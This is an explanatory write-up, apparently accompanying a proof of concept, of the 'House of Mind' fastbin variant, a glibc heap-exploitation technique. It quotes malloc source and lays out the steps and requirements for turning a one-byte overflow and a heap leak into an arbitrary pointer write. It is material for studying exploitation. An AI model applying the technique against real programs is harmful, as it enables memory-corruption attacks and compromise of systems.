House of Mind - Fastbin Variant
==========================

This attack is similar to the original 'House of Mind' in that it uses
a fake non-main arena in order to write to a new location. This
uses the fastbin for a WRITE-WHERE primitive in the 'fastbin'
variant of the original attack though. The original write for this
can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. 

By being able to allocate an arbitrary amount of chunks, a single byte
overwrite on a chunk size and a memory leak, we can control a super
powerful primitive. 

This could be used in order to write a freed pointer to an arbitrary
location (which seems more useful). Or, this could be used as a
write-large-value-WHERE primitive (similar to unsortedbin attack). 
 Both are interesting in their own right though but the first
option is the most powerful primitive, given the right setting.

Malloc chunks have a specified size and this size information
special metadata properties (prev_inuse, mmap chunk and non-main arena). 
The usage of non-main arenas is the focus of this exploit. For more information 
on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. 

First, we need to understand HOW the non-main arena is known from a chunk.

This the 'heap_info' struct: 

struct _heap_info
{
  mstate ar_ptr;           // Arena for this heap. <--- Malloc State pointer
  struct _heap_info *prev; // Previous heap.
  size_t size;            // Current size in bytes.
  size_t mprotect_size;   // Size in bytes that has been mprotected
  char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK]; // Proper alignment
} heap_info; 
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48

The important thing to note is that the 'malloc_state' within
an arena is grabbed from the ar_ptr, which is the FIRST entry 
of this. Malloc_state == mstate == arena 

The main arena has a special pointer. However, non-main arenas (mstate)
are at the beginning of a heap section. They are grabbed with the 
following code below, where the user controls the 'ptr' in 'arena_for_chunk':

#define heap_for_ptr(ptr) \
  ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1)))
#define arena_for_chunk(ptr) \
  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena)
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127

This macro takes the 'ptr' and subtracts a large value because the 
'heap_info' should be at the beginning of this heap section. Then, 
using this, it can find the 'arena' to use. 

The idea behind the attack is to use a fake arena to write pointers 
to locations where they should not go but abusing the 'arena_for_chunk' 
functionality when freeing a fastbin chunk.

This POC does the following things: 
- Finds a valid arena location for a non-main arena.
- Allocates enough heap chunks to get to the non-main arena location where 
  we can control the values of the arena data. 
- Creates a fake 'heap_info' in order to specify the 'ar_ptr' to be used as the arena later.
- Using this fake arena (ar_ptr), we can use the fastbin to write
  to an unexpected location of the 'ar_ptr' with a heap pointer. 

Requirements: 
- A heap leak in order to know where the fake 'heap_info' is located at.
	- Could be possible to avoid with special spraying techniques
- An unlimited amount of allocations
- A single byte overflow on the size of a chunk
	- NEEDS to be possible to put into the fastbin. 
	- So, either NO tcache or the tcache needs to be filled. 
- The location of the malloc state(ar_ptr) needs to have a value larger
  than the fastbin size being freed at malloc_state.system_mem otherwise
  the chunk will be assumed to be invalid.
	- This can be manually inserted or CAREFULLY done by lining up
	  values in a proper way. 
- The NEXT chunk, from the one that is being freed, must be a valid size
(again, greater than 0x20 and less than malloc_state.system_mem)


Random perks:
- Can be done MULTIPLE times at the location, with different sized fastbin
  chunks. 
- Does not brick malloc, unlike the unsorted bin attack. 
- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak.
